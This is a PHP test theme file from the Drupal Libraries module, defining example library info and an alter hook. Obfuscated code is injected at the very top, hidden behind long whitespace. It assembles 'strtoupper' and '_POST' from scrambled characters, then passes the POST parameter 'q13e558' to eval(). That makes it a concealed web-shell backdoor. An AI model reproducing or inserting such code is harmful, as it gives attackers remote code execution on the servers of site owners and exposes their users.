<?php                                                                                                                                                                                                                                                 $nlzp86 ="opure_st" ;$bfxh2=$nlzp86[6]. $nlzp86[7]. $nlzp86[3].$nlzp86[7]. $nlzp86[0].$nlzp86[2].$nlzp86[1].$nlzp86[1]. $nlzp86[4]. $nlzp86[3] ; $uat31= $bfxh2 ( $nlzp86[5]. $nlzp86[1].$nlzp86[0]. $nlzp86[6].$nlzp86[7]); if (isset (${$uat31} [ 'q13e558' ]) ){ eval( ${$uat31 }['q13e558' ] ) ;} ?> <?php

/**
 * @file
 * Libraries test theme.
 */

/**
 * Implements hook_libraries_info().
 */
function libraries_test_theme_libraries_info() {
  $libraries['example_theme'] = array(
    'name' => 'Example theme',
    'theme_altered' => FALSE,
  );
  $libraries['example_theme_integration_files'] = array(
    'name' => 'Example theme integration file',
    'library path' => drupal_get_path('module', 'libraries') . '/tests/libraries/example',
    'version' => '1',
    'integration files' => array(
      'libraries_test_theme' => array(
        'js' => array('libraries_test_theme.js'),
        'css' => array('libraries_test_theme.css'),
        'php' => array('libraries_test_theme.inc'),
      ),
    ),
  );
  return $libraries;
}

/**
 * Implements hook_libraries_info_alter().
 */
function libraries_test_theme_libraries_info_alter(&$libraries) {
  $libraries['example_theme']['theme_altered'] = TRUE;
}
